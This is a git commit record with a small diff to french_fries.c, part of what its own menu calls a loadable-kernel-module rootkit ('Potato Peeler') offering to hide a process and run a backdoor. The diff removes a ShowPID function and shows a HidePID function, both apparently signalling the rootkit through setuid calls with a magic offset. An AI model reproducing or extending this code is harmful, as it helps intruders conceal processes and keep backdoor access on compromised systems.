d4861765c1b10c4fe37f383a3f4dd585aa5508bb
vfreak <vancejones53@gmail.com>
2017-07-19 10:14:10 -0700

    Removed duplicate function.

--- french_fries.c
+++ french_fries.c
@@ -9,12 +9,6 @@ void HidePID(){
 	setuid(31337 + process_id);
 }
 
-void ShowPID(){
-	int process_id;
-	scanf("%d", &process_id);
-        setuid(31337 + process_id);
-}
-
 int main(){
 	printf("--- Potato Peeler ---\n--- A LKM Rootkit ---\n(1) Hide Process\n(2) Run Backdoor\n(3) Exit\n");
 	int choice;
